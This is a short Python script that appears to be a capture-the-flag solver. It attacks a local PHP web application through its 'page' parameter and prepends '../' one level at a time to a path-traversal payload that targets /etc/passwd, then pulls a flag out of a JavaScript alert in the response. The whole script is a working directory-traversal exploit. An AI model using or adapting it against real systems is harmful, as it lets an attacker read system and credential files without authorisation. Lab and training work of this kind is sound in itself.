import requests
import re

base_url = "http://localhost:8080/index.php?page="

payload = "../etc/passwd"
max_attempts = 20

session = requests.Session()

for i in range(max_attempts):
    url = base_url + payload
    print(f"Trying: {url}")

    try:
        response = session.get(url, timeout=5)
        content = response.text.lower()

        # Check if "flag" is in an alert
        if "alert" in content and "flag" in content:
            # Extract the flag using regex
            flag_match = re.search(r"alert\(['\"](.*?)['\"]\)", response.text, re.IGNORECASE)
            if flag_match:
                flag = flag_match.group(1)
                print(f"✅ {flag}")
            else:
                print("✅ Flag alert found, but couldn’t extract it.")
            break

        # If neither condition met, prepend "../" and try again
        payload = "../" + payload
        print(f"No match, trying next level: {payload}")

    except requests.RequestException as e:
        print(f"Error accessing {url}: {e}")
        break

# If max attempts reached
else:
    print("Max attempts reached. No 'flag' alert detected.")